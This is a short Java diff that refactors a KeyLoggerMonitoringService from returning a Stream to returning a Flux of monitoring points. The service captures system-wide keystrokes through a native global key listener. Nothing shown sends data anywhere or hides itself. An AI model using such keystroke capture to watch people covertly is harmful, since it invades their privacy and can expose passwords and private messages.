@@ -26,8 +26,9 @@ public class KeyLoggerMonitoringService implements Monitoring {
         return reportVisitor.visit(this);
     }
 
+
     @Override
-    public Stream<MonitoringPoint> startMonitoring(boolean isMonitoringStarted) {
+    public Flux<MonitoringPoint> startMonitoring(boolean isMonitoringStarted) {
         KeyListener keyListener = new KeyListener();
 
         try {
@@ -41,7 +42,6 @@ public class KeyLoggerMonitoringService implements Monitoring {
         GlobalScreen.addNativeKeyListener(keyListener);
 
         return Flux.defer(() -> Flux.fromIterable(keyListener.getKeys()))
-                .map(key -> (MonitoringPoint) new KeyLoggerMonitoringPoint(key))
-                .toStream();
+                .map(KeyLoggerMonitoringPoint::new);
     }
 }
